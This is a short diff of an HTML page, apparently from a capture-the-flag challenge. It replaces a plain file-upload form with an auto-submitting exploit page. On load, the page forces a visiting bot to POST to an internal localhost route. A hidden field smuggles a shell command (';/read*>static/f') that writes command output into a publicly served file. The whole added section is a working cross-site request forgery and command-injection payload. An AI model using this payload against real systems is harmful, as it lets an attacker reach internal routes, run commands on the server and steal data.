@@ -1,9 +1,14 @@
 <!DOCTYPE html>
 <html>
-<body>
-<form action="http://4bejgq67fwjb43vq.instance.penguin.0ops.sjtu.cn:18080/?action=upload" method="POST" enctype="multipart/form-data">
-  <input type="file" name="file">
-  <input type="submit" value="Upload">
-</form>
-</body>
+  <body>
+    <script>
+      // This script forces the Bot to POST to the internal restricted route
+      window.onload = function() {
+        document.getElementById('exploitForm').submit();
+      };
+    </script>
+    <form id="exploitForm" action="http://localhost:5000/search" method="POST">
+      <input type="hidden" name="search" value=";/read*>static/f">
+    </form>
+  </body>
 </html>
